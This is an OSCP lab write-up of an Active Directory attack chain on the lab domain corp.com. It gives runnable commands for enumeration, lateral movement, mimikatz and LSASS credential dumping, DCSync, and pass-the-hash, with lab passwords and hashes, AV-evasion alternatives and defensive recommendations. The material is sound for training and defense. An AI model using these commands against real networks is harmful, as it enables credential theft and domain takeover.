# DCSync Attack Chain - Educational Writeup
## OSCP Capstone: Chapter 23 - corp.com Domain Compromise

---

## Executive Summary

**Objective**: Compromise corp.com domain and retrieve flag from DC1 Administrator's desktop

**Attack Chain**:
```
Initial Creds (pete) → BloodHound Enumeration → Lateral Movement (mike → CLIENT75)
→ Credential Harvesting (mimikatz) → DCSync (maria) → Pass-the-Hash (Administrator) → Flag
```

**Time to Compromise**: ~3 sessions (enumeration-focused approach)

**Key Insight**: Service account caching on workstations provides Domain Admin credentials without password cracking

---

## Phase 1: Initial Enumeration

### Overview
Discover domain structure, users, and identify potential attack vectors using initial domain credentials.

### Prerequisites
- Valid domain credentials: `pete:Nexus123!`
- Network access to domain controller: `192.168.223.70`
- Tools: CrackMapExec/NetExec, ldapsearch, BloodHound

### Commands

**User Enumeration:**
```bash
crackmapexec smb 192.168.223.70 -u pete -p 'Nexus123!' --users
```
- Extracts all domain user accounts
- Shows account status (enabled/disabled)

**Password Policy:**
```bash
crackmapexec smb 192.168.223.70 -u pete -p 'Nexus123!' --pass-pol
```
- Reveals lockout threshold (5 attempts)
- Lockout duration (30 minutes)
- Critical for safe password spraying

**Host Discovery:**
```bash
crackmapexec smb 192.168.223.70-80 -u pete -p 'Nexus123!'
```
- Identifies live hosts: CLIENT74, CLIENT75, CLIENT76, WEB04, FILES04
- Shows Windows versions and signing requirements

### Indicators
- Domain users with `adminCount=1` are privileged
- Accounts with `DONT_REQ_PREAUTH` vulnerable to AS-REP Roasting
- Service accounts (like `iis_service`) vulnerable to Kerberoasting

### Common Failures
- **Subnet scanning fails**: CrackMapExec/Python 3.13 incompatibility
  - **Fix**: Use single IP or range (192.168.223.70-80)
  - **Alternative**: Use NetExec (maintained fork)

### Key Findings
- Users: pete, mike, maria (DA), dave, jeff, jeffadmin, jen, stephanie, iis_service
- maria is Domain Admin (target)
- mike has no special group memberships (requires deeper analysis)

---

## Phase 2: BloodHound Analysis

### Overview
Graph database analysis to discover non-obvious attack paths and privilege escalation opportunities.

### Prerequisites
- BloodHound data collected: `bh.zip`
- BloodHound GUI running
- Understanding of AD relationships (AdminTo, MemberOf, Sessions)

### Collection Method
```bash
# SharpHound from Windows:
.\SharpHound.exe -c All -d corp.com

# Python collector from Linux:
bloodhound-python -u pete -p 'Nexus123!' -d corp.com -ns 192.168.223.70 -c All
```

### Analysis Steps

**Upload Data:**
1. Start neo4j: `sudo neo4j start`
2. Launch BloodHound
3. Upload `bh.zip` or individual JSON files

**Critical Queries:**
- "Find Shortest Path to Domain Admins" (from pete/mike)
- "List all Domain Admins" (identify targets)
- "Find Computers with Unsupported Operating Systems"
- Custom: `MATCH (u:User {name:"MIKE@CORP.COM"})-[:AdminTo]->(c:Computer) RETURN u,c`

**Manual JSON Analysis (Alternative):**
```bash
unzip -o bh.zip -d bh/
jq '.data[].Properties | select(.name=="MIKE@CORP.COM") | .admincount' bh/20251123222828_users.json
jq '.data[] | select(.Properties.name=="CLIENT75.CORP.COM") | .LocalAdmins.Results' bh/20251123222828_computers.json
```

### Key Discovery
- **mike** has `AdminTo` relationship with `CLIENT75`
- Local admin enables:
  - WinRM/Evil-WinRM access
  - PSExec/WMIExec execution
  - Credential dumping (mimikatz)

### Indicators
- Red edges in BloodHound = exploitable paths
- Local admin on workstations = pivot opportunity
- Active sessions = cached credentials to harvest

### Common Failures
- **"No path found"**: May need to compromise intermediate accounts first
- **Stale session data**: Sessions shown in BloodHound may no longer be active
  - **Alternative**: Dump credentials anyway - service accounts often cached

---

## Phase 3: Lateral Movement (CLIENT75)

### Overview
Leverage mike's local admin privileges to access CLIENT75 and position for credential harvesting.

### Prerequisites
- Mike's credentials: `mike:Darkness1099!` (from earlier password spray)
- Mike has local admin on CLIENT75 (`192.168.223.75`)
- WinRM enabled on CLIENT75 (default for Windows 10+)

### Access Methods

**Evil-WinRM (Preferred for OSCP):**
```bash
evil-winrm -i 192.168.223.75 -u 'corp.com\mike' -p 'Darkness1099!'
```
- Interactive PowerShell session
- File upload/download capability
- Bypass execution policy automatically

**Alternatives:**
```bash
# PSExec (noisier, creates service):
impacket-psexec corp.com/mike:'Darkness1099!'@192.168.223.75

# WMIExec (stealthier, no service):
impacket-wmiexec corp.com/mike:'Darkness1099!'@192.168.223.75

# RDP (if RemoteDesktopUsers membership):
xfreerdp /u:mike /p:'Darkness1099!' /d:corp.com /v:192.168.223.75
```

### Indicators for Access
- **Local Admin** → WinRM/PSExec/WMI access (no explicit group needed)
- **RemoteDesktopUsers** → RDP access
- **Domain Admins** → Access to all domain systems

### Common Failures

**Evil-WinRM Domain Syntax:**
- **Wrong**: `evil-winrm -i 192.168.223.75 -u mike -p 'pass' -d corp.com`
  - Error: `invalid option: -d`
- **Correct**: `evil-winrm -i 192.168.223.75 -u 'corp.com\mike' -p 'pass'`
- **Alternative**: `-u mike -r corp.com` (realm flag for Kerberos)

**Kerberos Clock Skew:**
- Error: "KRB_AP_ERR_SKEW(Clock skew too great)"
- **Fix**: Sync time with DC: `sudo ntpdate 192.168.223.70`

### Exam Tips
- Test WinRM before RDP (faster, less detectable)
- Local admin bypasses explicit PSRemote group requirements
- Evil-WinRM allows tool upload (mimikatz, PowerUp, Rubeus)

---

## Phase 4: Credential Harvesting (Mimikatz)

### Overview
Extract cached credentials from CLIENT75 memory, targeting Domain Admin service sessions.

### Prerequisites
- Interactive session on CLIENT75 (Evil-WinRM)
- Local admin privileges (required for LSASS access)
- Mimikatz binary uploaded to CLIENT75

### Upload Mimikatz
```powershell
# From Evil-WinRM session:
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
# Or from SMB share, HTTP server, etc.
```

### Extraction Commands

**Dump Logon Passwords:**
```powershell
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > logonpasswords.txt
download logonpasswords.txt
```
- `privilege::debug` - Enables SeDebugPrivilege (required for LSASS)
- `sekurlsa::logonpasswords` - Extracts passwords/hashes from memory
- Output saved to file for offline analysis

**Dump Kerberos Tickets:**
```powershell
.\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
```
- Exports `.kirbi` files (Kerberos tickets)
- Useful for Pass-the-Ticket attacks

### Critical Findings

**Maria (Domain Admin):**
```
Authentication Id : 0 ; 1219686 (00000000:00129c66)
Session           : Service from 0
User Name         : maria
Domain            : CORP
NTLM              : 2a944a58d4ffa77137b2c587e6ed7626
```

**Dave (Standard User):**
```
User Name         : dave
Domain            : CORP
Password          : Flowers1
```

### Why Credentials Were Cached
- **maria**: Service account running scheduled task on CLIENT75
- Session type: "Service from 0" (SYSTEM context)
- Credentials cached in LSASS until reboot or timeout
- **No interactive logon required** for caching

### Indicators
- `Session : Service` = Service account (persistent caching)
- `Session : Interactive` = User logged in locally
- `Session : RemoteInteractive` = RDP session
- Kerberos TGT timestamp = Last authentication time

### Common Failures

**Access Denied:**
- Cause: Not running as local admin
- **Fix**: Verify with `whoami /groups` (look for `BUILTIN\Administrators`)

**Empty Output:**
- Cause: Credential Guard enabled (Windows 10+ hardening)
- **Alternative**: Use registry/SAM dump, DCSync if DA already obtained

**AV Detection:**
- Mimikatz frequently flagged by Windows Defender
- **Alternatives**:
  - SafetyKatz (in-memory, no disk write)
  - Invoke-Mimikatz (PowerShell version)
  - Pypykatz (Linux-based, parse offline dumps)
  - Manual LSASS dump: `procdump64.exe -ma lsass.exe lsass.dmp`

### Manual Alternative (No Mimikatz)
```powershell
# Dump LSASS process:
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_PID> C:\temp\lsass.dmp full

# Parse on Kali with pypykatz:
pypykatz lsa minidump lsass.dmp
```

### Exam Tips
- Always dump credentials on compromised admin-level systems
- Service sessions are goldmines (persistent, often DA)
- Save all mimikatz output to files for later analysis
- Time estimate: 5-10 minutes

---

## Phase 5: DCSync Attack

### Overview
Abuse Domain Admin privileges to replicate entire domain credential database from DC.

### Prerequisites
- Domain Admin credentials (maria's NTLM hash)
- Network access to DC1: `192.168.223.70`
- Tool: impacket-secretsdump

### Attack Theory
DCSync exploits domain replication protocol (MS-DRSR):
- Domain Controllers replicate credential database for redundancy
- Accounts with "Replicating Directory Changes" permissions can request replication
- Domain Admins have this permission by default
- DC doesn't distinguish between legitimate DC and attacker

### Execution
```bash
impacket-secretsdump -hashes :2a944a58d4ffa77137b2c587e6ed7626 \
  corp.com/maria@192.168.223.70 -just-dc-ntlm
```

**Flag Breakdown:**
- `-hashes :NTLM` - Pass-the-Hash authentication (LM:NTLM format)
  - LM hash deprecated, use `:` placeholder
- `-just-dc-ntlm` - Only extract NTLM hashes (faster)
- `-just-dc-user ADMIN` - Target specific user
- `corp.com/maria@IP` - Domain, username, target DC

### Expected Output
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:4adb23d0a33907193029f55a8a9ba303:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1693c6cefafffc7af11ef34d1c788f47:::
[... all domain users and computer accounts ...]
```

**Format**: `username:RID:LM_hash:NTLM_hash:::`

### Critical Extractions
- **Administrator**: `4adb23d0a33907193029f55a8a9ba303` (final target)
- **krbtgt**: `1693c6cefafffc7af11ef34d1c788f47` (Golden Ticket attacks)
- **Computer accounts**: For Silver Ticket attacks

### Indicators
- Success = Full credential dump in seconds
- Failure = "Access Denied" (insufficient privileges)
- Event ID 4662 logged on DC (replication request)

### Common Failures

**Insufficient Privileges:**
```
ERROR: User credentials are not valid
```
- Cause: Account is not Domain Admin or lacks replication rights
- **Verify**: `net user maria /domain` (check "Domain Admins" membership)

**Network Issues:**
```
ERROR: Cannot connect to DC
```
- Cause: Firewall blocking, DC offline, wrong IP
- **Test**: `crackmapexec smb 192.168.223.70 -u maria -H <hash>`

### Alternative Methods

**Mimikatz DCSync (from Windows):**
```powershell
.\mimikatz.exe "lsadump::dcsync /domain:corp.com /user:Administrator"
```

**Volume Shadow Copy (requires DA on DC):**
```powershell
# Create shadow copy of C: drive:
vssadmin create shadow /for=C:

# Copy NTDS.dit and SYSTEM hive:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\

# Parse offline on Kali:
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

### Defense Evasion
- DCSync is stealthy (normal replication traffic)
- Detection requires monitoring Event ID 4662 for non-DC sources
- Mimics legitimate DC behavior

### Exam Tips
- Save output to file: `impacket-secretsdump ... > domain_hashes.txt`
- Extract Administrator and krbtgt hashes immediately
- Time estimate: 2-3 minutes
- Can be done from Linux (impacket) or Windows (mimikatz)

---

## Phase 6: Administrator Access & Flag Retrieval

### Overview
Use dumped Administrator hash to access DC1 and retrieve flag via Pass-the-Hash.

### Prerequisites
- Administrator NTLM hash: `4adb23d0a33907193029f55a8a9ba303`
- Network access to DC1: `192.168.223.70`
- Tool: Evil-WinRM, PSExec, or WMIExec

### Access Methods

**Evil-WinRM (Recommended):**
```bash
evil-winrm -i 192.168.223.70 -u Administrator -H 4adb23d0a33907193029f55a8a9ba303
```
- Interactive PowerShell on DC
- Full SYSTEM-level access
- File download capability

**Alternatives:**
```bash
# PSExec:
impacket-psexec -hashes :4adb23d0a33907193029f55a8a9ba303 \
  Administrator@192.168.223.70

# WMIExec (semi-interactive):
impacket-wmiexec -hashes :4adb23d0a33907193029f55a8a9ba303 \
  Administrator@192.168.223.70

# SMBExec:
impacket-smbexec -hashes :4adb23d0a33907193029f55a8a9ba303 \
  Administrator@192.168.223.70
```

### Flag Retrieval
```powershell
# From Evil-WinRM or PSExec shell:
type C:\Users\Administrator\Desktop\flag.txt

# Or PowerShell cmdlet:
Get-Content C:\Users\Administrator\Desktop\flag.txt

# Download file:
download C:\Users\Administrator\Desktop\flag.txt
```

### Indicators
- Successful auth = PowerShell prompt or cmd shell
- Hostname should show DC1
- `whoami` returns `corp\administrator`

### Common Failures

**Wrong Hash Format:**
- impacket requires LM:NTLM or :NTLM format
- **Wrong**: `-H 4adb23d0a33907193029f55a8a9ba303`
- **Correct**: `-hashes :4adb23d0a33907193029f55a8a9ba303`

**SMB Signing Issues:**
- Some tools fail if SMB signing enforced
- **Fix**: Use Evil-WinRM (supports signing)

### Exam Tips
- Time estimate: 1-2 minutes
- Screenshot flag retrieval for report
- Verify flag format/content before disconnecting

---

## Security Findings & Defense Recommendations

### Vulnerabilities Exploited

1. **Weak Credential Management**
   - 8 accounts share same password (Administrator, dave, jeff, jeffadmin, iis_service, jen, stephanie)
   - Hash: `4adb23d0a33907193029f55a8a9ba303`

2. **Over-Privileged Service Accounts**
   - maria (Domain Admin) running services on workstation (CLIENT75)
   - Credentials cached in LSASS, accessible to local admins

3. **Excessive Local Admin Grants**
   - mike has local admin on CLIENT75 despite being standard domain user
   - No business justification visible

4. **Lack of Credential Guard**
   - Mimikatz successfully dumped plaintext/hash credentials
   - Windows Defender Credential Guard not enabled

5. **No DCSync Monitoring**
   - DCSync attack completed without detection
   - Event ID 4662 not monitored for anomalous replication

### Defense Recommendations

**Tier 0 (Immediate):**
- Enable Windows Defender Credential Guard on all systems
- Implement LAPS (Local Administrator Password Solution) for unique local admin passwords
- Remove Domain Admin accounts from workstation service contexts
- Monitor Event ID 4662 (DCSync detection)

**Tier 1 (Short-term):**
- Enforce unique passwords for all privileged accounts
- Implement tiered administration model (separate admin accounts for workstations/servers/DCs)
- Enable Protected Users security group for Domain Admins
- Deploy EDR/AV with mimikatz behavior detection

**Tier 2 (Long-term):**
- Implement PAM (Privileged Access Management) solution
- Just-in-time admin access with time-limited privileges
- Regular BloodHound analysis to identify attack paths
- Red team exercises to validate defenses

---

## Alternative Attack Paths (Not Taken)

### Path 1: Kerberoasting → iis_service
- `iis_service` has SPN (servicePrincipalName)
- Could request TGS ticket and crack offline
- **Why skipped**: Service sessions provided faster path

### Path 2: Password Spray → dave:Flowers1
- dave's password follows pattern (Word + Number)
- Could spray against other users
- **Why skipped**: dave is not privileged

### Path 3: AS-REP Roasting → mike
- mike has "Do not require Kerberos preauthentication" set
- Could obtain crackable AS-REP hash
- **Why skipped**: Already had mike's password

### Path 4: Golden Ticket → krbtgt
- With krbtgt hash (`1693c6cefafffc7af11ef34d1c788f47`), can forge TGTs
- Unlimited domain access without re-authentication
- **Post-compromise option**: Persistence mechanism

---

## Timeline Summary

| Phase | Action | Time | Cumulative |
|-------|--------|------|------------|
| 1 | Initial enumeration (users, policies, hosts) | 15 min | 15 min |
| 2 | BloodHound collection and analysis | 20 min | 35 min |
| 3 | Lateral movement to CLIENT75 (mike) | 5 min | 40 min |
| 4 | Credential harvesting (mimikatz) | 10 min | 50 min |
| 5 | DCSync attack (maria → domain hashes) | 3 min | 53 min |
| 6 | Administrator access and flag retrieval | 2 min | **55 min** |

**Exam Context**: With methodology mastered, this attack chain could be executed in under 60 minutes.

---

## Key Learning Objectives

### Technical Skills Demonstrated
- Active Directory enumeration (manual and automated)
- BloodHound graph analysis and Cypher queries
- Lateral movement techniques (Evil-WinRM, PSExec)
- Credential dumping with mimikatz
- Pass-the-Hash authentication
- DCSync replication abuse
- Privilege escalation path identification

### Methodology Principles
1. **Enumerate thoroughly before exploiting** (BloodHound revealed non-obvious path)
2. **Service sessions are high-value targets** (maria cached on CLIENT75)
3. **Local admin = pivot opportunity** (mike → CLIENT75 → maria)
4. **Pass-the-Hash eliminates password cracking** (saved hours of hashcat time)
5. **DCSync is fastest domain dump method** (seconds vs. manual extraction)

### OSCP Exam Relevance
- Domain credential harvesting (common exam scenario)
- Lateral movement in multi-machine environments
- Understanding AD privilege relationships
- Tool-based and manual exploitation alternatives
- Time management (prioritize high-value targets)

---

## Tools Reference

| Tool | Purpose | OSCP Allowed? |
|------|---------|---------------|
| CrackMapExec/NetExec | SMB enumeration, credential validation | Yes |
| BloodHound | AD relationship graphing | Yes |
| Evil-WinRM | Windows remote management client | Yes |
| Mimikatz | Credential extraction | Yes (bring your own) |
| impacket-secretsdump | DCSync implementation | Yes |
| impacket-psexec | Remote command execution | Yes |
| ldapsearch | LDAP queries | Yes |

**All tools used are allowed in OSCP exam environment.**

---

## Exam Day Checklist

- [ ] Enumerate password policy FIRST (avoid lockouts)
- [ ] Collect BloodHound data early (run while doing other tasks)
- [ ] Document all credentials immediately (file + notes)
- [ ] Test Pass-the-Hash before attempting password cracking
- [ ] Save all tool output to files (evidence for report)
- [ ] Dump credentials on EVERY compromised admin-level system
- [ ] Try DCSync if you have DA (fastest full domain compromise)
- [ ] Screenshot flag retrieval with timestamp
- [ ] Keep detailed command log (copy-paste from terminal)

---

**Remember**: This writeup documents the successful path. Real penetration tests involve failed attempts, rabbit holes, and troubleshooting. Document failures as thoroughly as successes - they teach methodology.
